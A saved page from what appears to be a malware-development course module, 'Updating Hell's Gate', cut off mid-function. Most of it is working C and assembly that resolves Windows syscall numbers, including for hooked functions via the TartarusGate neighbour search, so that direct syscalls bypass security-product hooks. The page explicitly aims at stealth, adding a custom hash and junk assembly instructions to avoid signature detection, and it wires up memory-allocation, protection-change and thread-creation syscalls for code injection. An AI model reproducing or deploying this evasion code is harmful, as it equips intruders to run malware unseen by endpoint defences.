<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Updating%20Hell's%20Gate_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Updating%20Hell's%20Gate_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Updating%20Hell's%20Gate_files/css2.css" rel="stylesheet">
        <link href="Updating%20Hell's%20Gate_files/css2_002.css" rel="stylesheet">
        <title>Updating Hell's Gate</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Updating%20Hell's%20Gate_files/app.fdbb573b.css"><link rel="stylesheet" href="Updating%20Hell's%20Gate_files/app.fdbb573b.css"><link rel="stylesheet" href="Updating%20Hell's%20Gate_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Updating%20Hell's%20Gate_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 88 - Updating Hell's Gate
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Updating%20Hell's%20Gate_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Updating%20Hell's%20Gate_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Updating%20Hell's%20Gate_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/HellsGateUpdated" target="_blank">
                    <img src="Updating%20Hell's%20Gate_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Updating Hell's Gate</h2>
<h3>Introduction</h3>
<p>The <em>Syscalls - Hell's Gate</em> module introduced the Hell's Gate
 technique, which bypasses userland hooks by searching for the syscall 
number in the hook bytes to be used later as a directly called syscall. 
This module updates the original Hell's Gate implementation that was 
demonstrated in that module.</p>
<p>The updates will make the implementation more custom and as a result,
 make it more stealthy and reduce signature-based detection. 
Additionally, the updated code will change the way the implementation 
retrieves a syscall's SSN by using <a href="https://github.com/trickster0/TartarusGate" target="_blank">TartarusGate's</a> approach.</p>
<p>If you require a refresher on the original Hell's Gate implementation, visit the <a href="https://github.com/am0nsec/HellsGate" target="_blank">Hell's Gate GitHub repository</a>.</p>
<h3>Updating The String Hashing Algorithm</h3>
<p>The original Hell's Gate implementation used the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92" target="_blank">DJB2</a>
 string hashing algorithm. Updating the string hashing algorithm does 
not affect the Hell's Gate implementation, but modifying the string 
hashing algorithm will likely reduce the likelihood of signature 
detection. The <code>djb2</code> function is replaced with the following function.</p>
<pre><code>unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}
</code></pre>
<p>The <code>crc32h</code> function is an implementation of the <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check" target="_blank">Cyclic Redundancy Check</a> string hashing algorithm and will be used in this module. To promote code readability and maintainability, the <code>crc32h</code> function will be called through the following macro.</p>
<pre><code>#define HASH(API) crc32h((char*)API)
</code></pre>
<p>Where the <code>API</code> variable is the string to hash using <code>crc32h</code>.</p>
<h3>Updating GetVxTableEntry</h3>
<h4>Creating The NTDLL_CONFIG Structure</h4>
<p>Recall that <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L120" target="_blank">GetVxTableEntry</a> is the function used to retrieve the address and SSN of a specified syscall using its hash. The <code>GetVxTableEntry</code> function calculates the required RVAs to search for the specified hash and takes two additional parameters, <code>pModuleBase</code> and <code>pImageExportDirectory</code>, which are not related to its purpose. To improve efficiency, the <code>NTDLL_CONFIG</code> structure is created and shown below.</p>
<pre><code>typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions     
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                 
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs  

}NTDLL_CONFIG, *PNTDLL_CONFIG;

// global variable
NTDLL_CONFIG g_NtdllConf = { 0 };
</code></pre>
<h4>Creating InitNtdllConfigStructure</h4>
<p>Furthermore, a private function, <code>InitNtdllConfigStructure</code>, is created and called by <code>GetVxTableEntry</code> in order to initialize the <code>g_NtdllConf</code> global structure. This allows <code>GetVxTableEntry</code> to access values from inside NTDLL's headers without requiring additional parameters or calculations each time. As a result, <code>InitNtdllConfigStructure</code> initializes the <code>g_NtdllConf</code> structure for future usage.</p>
<p>The <code>InitNtdllConfigStructure</code> function fetches the NTDLL 
base address and performs PE parsing to retrieve the export directory 
structure. The function then calculates the necessary RVAs to fill the <code>g_NtdllConf</code> structure with the required data. The function returns <code>TRUE</code> if it succeeds in performing these actions and <code>FALSE</code> if <code>g_NtdllConf</code> still contains uninitialized elements.</p>
<pre><code>BOOL InitNtdllConfigStructure() {

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr-&gt;DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return FALSE;
    
    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the 'g_NtdllConf' structure's element
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir-&gt;NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir-&gt;AddressOfNameOrdinals);

    // checking
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}
</code></pre>
<h4>Renaming &amp; Updating GetVxTableEntry</h4>
<p><code>GetVxTableEntry</code> is renamed to <code>FetchNtSyscall</code> and will have two parameters: <code>dwSysHash</code>, the hash value of the specified syscall to fetch the SSN for and <code>pNtSys</code>, a pointer to an <code>NT_SYSCALL</code> structure which contains everything required to perform a direct syscall. This structure will be initialized by <code>FetchNtSyscall</code>.</p>
<pre><code>typedef struct _NT_SYSCALL
{
	DWORD dwSSn;                    // syscall number
	DWORD dwSyscallHash;            // syscall hash value
	PVOID pSyscallAddress;          // syscall address
    
}NT_SYSCALL, *PNT_SYSCALL;
</code></pre>
<p>The <code>FetchNtSyscall</code> function does the following:</p>
<ul>
<li>
<p>Checks if the global <code>g_NtdllConf</code> structure is initialized. If not, it calls <code>InitNtdllConfigStructure</code> to do so.</p>
</li>
<li>
<p>Checks if the user specified a hash value, if not it returns <code>FALSE</code>.</p>
</li>
<li>
<p>Initiates a for-loop to search for the specified syscall using its hash.</p>
</li>
<li>
<p>When the syscall is found, it saves its address into the <code>pNtSys</code> structure.</p>
</li>
<li>
<p>It then initiates a while-loop that searches for the SSN of the 
syscall. The search logic is the same as the original implementation.</p>
</li>
<li>
<p>If the SSN is found, it's saved into the <code>pNtSys</code> structure.</p>
</li>
<li>
<p>The function then breaks out of both loops and performs a final check to ensure that all the members of the <code>NT_SYSCALL</code> structure are initialized.</p>
</li>
<li>
<p>The result is returned upon this check.</p>
</li>
</ul>
<pre><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    // if no hash value was specified
    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    // searching for 'dwSysHash' in the exported functions of ntdll
    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {
           
            // save the address
            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            WORD cw = 0;

            // search for the ssn 
            while (TRUE) {

                // reached 'ret' instruction - we are so far down
                if (*((PBYTE)pFuncAddress + cw) == 0xC3 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                // reached 'syscall' instruction - we are so far down
                if (*((PBYTE)pFuncAddress + cw) == 0x0F &amp;&amp; *((PBYTE)pFuncAddress + cw + 1) == 0x05 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                if (*((PBYTE)pFuncAddress + cw) == 0x4C
                    &amp;&amp; *((PBYTE)pFuncAddress + 1 + cw) == 0x8B
                    &amp;&amp; *((PBYTE)pFuncAddress + 2 + cw) == 0xD1
                    &amp;&amp; *((PBYTE)pFuncAddress + 3 + cw) == 0xB8
                    &amp;&amp; *((PBYTE)pFuncAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFuncAddress + 7 + cw) == 0x00) {

                    BYTE high = *((PBYTE)pFuncAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFuncAddress + 4 + cw);
                    // save the ssn 
                    pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                    break; // break while-loop 
                }

                cw++;
            }

            break; // break for-loop 
        }
    }

    // checking if all NT_SYSCALL's (pNtSys) element are initialized
    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}
</code></pre>
<h3>Enhancing SSN Retrieval Logic</h3>
<p>Recall when Hell's Gate searches for an SSN, it limits the search boundary by checking for the <code>syscall</code> or <code>ret</code>
 instructions. If one of these instructions is found and the SSN has not
 yet been obtained, the search fails, preventing the retrieval of a 
wrong SSN value of another syscall function.</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-118970171-6a388cdf-2e50-4441-8013-d4fb0afcd.png" alt="image"></p>
<h4>TartarusGate</h4>
<p>There is an alternative way of searching for the SSN that was introduced in <a href="https://github.com/trickster0/TartarusGate" target="_blank">TartarusGate</a>, which is illustrated in the image below.</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-218996854-1d20335d-ebc6-4c6c-b2a2-e8f584ac8.png" alt="image"></p>
<p>Assume syscall B is being called using the Hell's Gate implementation, it will search for the <code>0x4c, 0x8b, 0xd1, 0xb8</code> opcodes which represent the <code>mov r10, rcx</code> and <code>mov rcx, ssn</code>
 instructions. But as shown in the image above, there are no such 
opcodes, meaning Hell's Gate's implementation would fail in obtaining 
the SSN of syscall B.</p>
<p>TartarusGate uses neighboring syscalls to calculate the SSN of the 
specified syscall. If TartarusGate searches upwards then the SSN of 
syscall B is the <code>SSN of syscall A - 1</code>. On the other hand, if TartarusGate searches downwards then the SSN of syscall B is the <code>SSN of syscall C + 1</code>.</p>
<h4>TartarusGate Example</h4>
<p>When <code>NtProtectVirtualMemory</code> is unhooked, its SSN is <code>0x50</code>.</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-318996340-a18adfb0-0cbe-4ac2-a5cd-b504f8f60.png" alt="image"></p>
<p>The image below uses <code>ZwIsProcessInJob</code> as syscall A, <code>NtProtectVirtualMemory</code> as syscall B, and <code>NtQuerySection</code> as syscall C. <code>NtProtectVirtualMemory</code> is hooked, but its SSN can still be calculated using the adjacent syscalls (A &amp; C).</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-418994573-eaf74f3a-647c-44a2-9ce2-ac97916a9.png" alt="image"></p>
<p>Using the previously explained logic where upward search uses <code>SSN of syscall A - 1</code> and downward search uses <code>SSN of syscall C + 1</code>, they both successfully result in <code>NtProtectVirtualMemory</code>'s correct SSN, <code>0x50</code>.</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-518995420-b4dc7adb-c5f2-4a38-99a1-cfb1e845f.png" alt="image"></p>
<p>Note that the search path can extend beyond the direct neighboring 
syscalls. For example, if one is calling syscall C, which is hooked, 
then syscall C's SSN is equal to the following:</p>
<ul>
<li>
<p>Syscall A's SSN plus two</p>
</li>
<li>
<p>Syscall B's SSN plus one</p>
</li>
<li>
<p>Syscall D's SSN minus one</p>
</li>
<li>
<p>Syscall E's SSN minus two</p>
</li>
<li>
<p>Syscall F's SSN minus three</p>
</li>
</ul>
<p>The image below illustrates this more clearly, where <code>idx</code> is the number to add or subtract.</p>
<p><img src="Updating%20Hell's%20Gate_files/hellsgate-update-619273167-9a251b35-1cb2-477a-80ba-b5ac9c009.png" alt="image"></p>
<h4>Updating FetchNtSyscall</h4>
<p>After understanding how TartarusGate works, the <code>FetchNtSyscall</code> function is updated to use that search logic. Some aspects of the updated <code>FetchNtSyscall</code> function:</p>
<ul>
<li>
<p><code>RANGE</code> is 255, representing the maximum number of syscalls to go up or down in the memory.</p>
</li>
<li>
<p><code>UP</code> is equal to 32, which is the size of a syscall. This is used when searching upwards.</p>
</li>
<li>
<p><code>DOWN</code> is equal to -32, which is the negative size of a syscall. This is used when searching downward.</p>
</li>
<li>
<p>When the search path is upwards, the specified syscall's SSN is <code>(high &lt;&lt; 8) | low + idx</code>, where <code>idx</code> is the number of syscalls above the current syscall (<code>pFuncAddress</code>'s address).</p>
</li>
<li>
<p>When the search path is downward, the specified syscall's SSN is <code>(high &lt;&lt; 8) | low - idx</code>, where <code>idx</code> is the number of syscalls below the current syscall (<code>pFuncAddress</code> address).</p>
</li>
</ul>
<pre><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
    
    // initialize ntdll config if not found
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++){

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);
        
        pNtSys-&gt;pSyscallAddress = pFuncAddress;

        // if syscall found
        if (HASH(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == 0x8B
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == 0xD1
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == 0xB8
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low  = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }
        
            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {
                
                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }
            
            break; // break for-loop [i]
        
        }

    }


    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}
</code></pre>
<h3>Updating Assembly Functions</h3>
<p>The functions <code>HellsGate</code> and <code>HellDescent</code>, found in <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank">hellsgate.asm</a> will be replaced with <code>SetSSn</code> and <code>RunSyscall</code> respectively. <code>SetSSn</code> requires the SSN of the syscall to be called and <code>RunSyscall</code> will execute it.</p>
<p>There aren't any major updates to these two functions, however, 
additional assembly instructions were added which do not affect the 
program's execution but will add obfuscation.</p>
<h4>Unobfuscated Assembly Functions</h4>
<p><code>SetSSN</code> &amp; <code>RunSyscall</code> without unnecessary assembly instructions.</p>
<pre><code>.data
	wSystemCall DWORD 0000h

.code 

	SetSSn PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	SetSSn ENDP
	
	RunSyscall PROC
		mov r10, rcx
		mov eax, wSystemCall
		syscall
		ret
	RunSyscall ENDP
	
end	
</code></pre>
<h4>Obfuscated Assembly Functions</h4>
<p><code>SetSSN</code> &amp; <code>RunSyscall</code> with added assembly instructions.</p>
<pre><code>.data
	wSystemCall DWORD 0000h

.code 

	SetSSn PROC
			xor eax, eax			; eax = 0
			mov wSystemCall, eax		; wSystemCall = 0					
			mov eax, ecx			; eax = ssn
			mov r8d, eax			; r8d = eax = ssn
			mov wSystemCall, r8d		; wSystemCall = r8d = eax = ssn		
			ret
	SetSSn ENDP
	
	RunSyscall PROC
			xor r10, r10			; r10 = 0
			mov rax, rcx			; rax = rcx
			mov r10, rax			; r10 = rax = rcx			
			mov eax, wSystemCall		; eax = ssn					
			jmp Run                  ; execute 'Run'
			xor eax, eax     ; wont run
			xor rcx, rcx     ; wont run
			shl r10, 2       ; wont run
		Run:
			syscall					
			ret						
	RunSyscall ENDP
	
end	
</code></pre>
<h3>Updating The Main Function</h3>
<h4>Creating The NTAPI_FUNC Structure</h4>
<p>The updated Hell's Gate implementation is now completed. The last 
part is to test the implementation which requires the main function. To 
do so, a new structure is created that replaces the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank">VX_TABLE</a>. The new structure, <code>NTAPI_FUNC</code>,
 will contain the syscalls' information. Storing this information in a 
structure will enable calling the syscalls multiple times when 
initialized as a global variable.</p>
<p>The <code>NTAPI_FUNC</code> structure is shown below.</p>
<pre><code>typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;

}NTAPI_FUNC, *PNTAPI_FUNC;

// global variable
NTAPI_FUNC g_Nt = { 0 };
</code></pre>
<h4>Creating InitializeNtSyscalls</h4>
<p>To populate the <code>g_Nt</code> global variable, the newly created function, <code>InitializeNtSyscalls</code>, will call <code>FetchNtSyscall</code> to initialize all members of <code>NTAPI_FUNC</code>.</p>
<pre><code>BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n", g_Nt.NtAllocateVirtualMemory.dwSSn);


	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n", g_Nt.NtProtectVirtualMemory.dwSSn);


	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}
	printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n", g_Nt.NtCreateThreadEx.dwSSn);


	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}
